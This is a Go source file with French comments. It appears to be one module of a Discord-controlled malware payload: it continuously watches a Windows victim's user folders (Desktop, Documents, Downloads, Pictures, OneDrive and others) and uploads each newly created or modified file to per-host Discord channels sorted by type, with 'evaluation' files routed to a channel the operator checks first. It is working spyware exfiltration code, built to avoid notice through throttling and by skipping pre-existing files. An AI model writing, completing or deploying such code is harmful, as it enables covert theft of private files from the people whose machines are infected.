// fileexfil.go — veille temps réel des dossiers utilisateur.
//
// Chaque machine possède une catégorie Discord avec un salon par type de
// fichier : `-files-pdf`, `-files-images`, `-files-docs`, `-files-archives`,
// `-files-new`. Un fichier déposé sur le poste (téléchargement, capture,
// export) part dans le salon correspondant quelques secondes plus tard.
//
// La veille démarre sur un état « déjà vu » : rien de ce qui préexiste n'est
// renvoyé. Seuls les fichiers créés ou modifiés après le lancement partent,
// ce qui évite de déverser un disque entier à l'ouverture.
package main

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	exfilMaxBytes = 8 * 1024 * 1024 // limite d'une pièce jointe Discord
	exfilMaxPass  = 6               // fichiers envoyés par passage
	exfilPeriod   = 15 * time.Second
)

var (
	exfilSeenMu sync.Mutex
	exfilSeen   = map[string]string{} // chemin -> "taille:mtime"
)

// exfilRoots liste les dossiers utilisateur surveillés. Les dossiers absents
// sont simplement ignorés (machine sans OneDrive, sans Musique…).
func exfilRoots() []string {
	home := os.Getenv("USERPROFILE")
	if home == "" {
		return nil
	}
	var roots []string
	for _, name := range []string{
		"Desktop", "Bureau", "Documents", "Downloads", "Téléchargements",
		"Pictures", "Images", "Videos", "Vidéos", "Music", "Musique",
	} {
		p := filepath.Join(home, name)
		if st, err := os.Stat(p); err == nil && st.IsDir() {
			roots = append(roots, p)
		}
	}
	for _, name := range []string{"Desktop", "Documents", "Downloads", "Pictures"} {
		p := filepath.Join(home, "OneDrive", name)
		if st, err := os.Stat(p); err == nil && st.IsDir() {
			roots = append(roots, p)
		}
	}
	return roots
}

// exfilChannelFor renvoie le salon dédié à l'extension. Une extension inconnue
// part dans `-files-new` (le flux « nouveaux fichiers »).
func exfilChannelFor(name string) string {
	// Les évaluations ont leur propre salon : c est le premier endroit que
	// l opérateur ouvre.
	if fileScore(name) >= 100 {
		return channelOrFallback(hostChannelName() + "-files-eval")
	}
	ext := strings.ToLower(filepath.Ext(name))
	host := hostChannelName()
	switch {
	case ext == ".pdf":
		return channelOrFallback(host + "-files-pdf")
	case strings.Contains(".jpg,.jpeg,.png,.bmp,.gif,.tiff,.webp,.heic,.svg", ext):
		return channelOrFallback(host + "-files-images")
	case strings.Contains(".doc,.docx,.xls,.xlsx,.ppt,.pptx,.odt,.ods,.odp,.rtf,.txt,.md,.csv,.json", ext):
		return channelOrFallback(host + "-files-docs")
	case strings.Contains(".zip,.rar,.7z,.tar,.gz,.iso,.cab", ext):
		return channelOrFallback(host + "-files-archives")
	default:
		return channelOrFallback(host + "-files-new")
	}
}

// channelOrFallback résout un salon nommé, avec repli sur le salon de
// commande si le serveur refuse la création.
func channelOrFallback(name string) string {
	id, done := namedChannel(name)
	if id != "" {
		return id
	}
	if done {
		return targetChannel()
	}
	return ""
}

// skipExfil dit si un chemin doit être ignoré : dossiers système, caches de
// développement, notre propre dossier de travail, fichiers temporaires.
func skipExfil(path string, info os.FileInfo) bool {
	if info.IsDir() {
		base := strings.ToLower(info.Name())
		switch base {
		case "appdata", "windows", "program files", "program files (x86)",
			"node_modules", ".git", ".cache", "temp", "tmp", "recycle.bin",
			"system volume information", "$recycle.bin":
			return true
		}
		return false
	}
	low := strings.ToLower(info.Name())
	if strings.HasSuffix(low, ".tmp") || strings.HasSuffix(low, ".crdownload") ||
		strings.HasSuffix(low, ".part") || strings.HasPrefix(low, "~$") {
		return true
	}
	if strings.HasPrefix(path, workDir()) {
		return true
	}
	return false
}

// watchFiles est la boucle de veille : elle tourne tant que le payload vit.
func watchFiles() {
	roots := exfilRoots()
	if len(roots) == 0 {
		return
	}
	// Amorçage : tout l'existant est marqué comme vu, sans envoi.
	for _, root := range roots {
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() {
				return nil
			}
			exfilSeen[p] = stampOf(info)
			return nil
		})
	}
	plog("veille fichiers : " + strings.Join(roots, ", "))

	for {
		time.Sleep(exfilPeriod)
		if stopped.Load() {
			return
		}
		sent := 0
		for _, root := range roots {
			if sent >= exfilMaxPass || stopped.Load() {
				break
			}
			_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
				if err != nil || info == nil || sent >= exfilMaxPass {
					return nil
				}
				if skipExfil(p, info) {
					if info.IsDir() {
						return filepath.SkipDir
					}
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() == 0 || info.Size() > exfilMaxBytes {
					return nil
				}
				st := stampOf(info)
				if exfilSeen[p] == st {
					return nil
				}
				exfilSeen[p] = st
				ch := exfilChannelFor(p)
				if ch == "" {
					return nil
				}
				data, rerr := os.ReadFile(p)
				if rerr != nil {
					return nil
				}
				name := time.Now().Format("060102-150405") + "_" + filepath.Base(p)
				sendFilesTo(ch, fileOut{Name: name, Data: data})
				plog("veille fichiers : " + name + " → " + ch)
				sent++
				time.Sleep(700 * time.Millisecond) // limite de débit Discord
				return nil
			})
		}
	}
}

// stampOf fabrique l'empreinte de changement d'un fichier.
func stampOf(info os.FileInfo) string {
	return time.Unix(info.ModTime().Unix(), 0).Format("20060102150405") +
		":" + itoa64(info.Size())
}

// itoa64 évite d'importer strconv juste pour une conversion.
func itoa64(n int64) string {
	if n == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
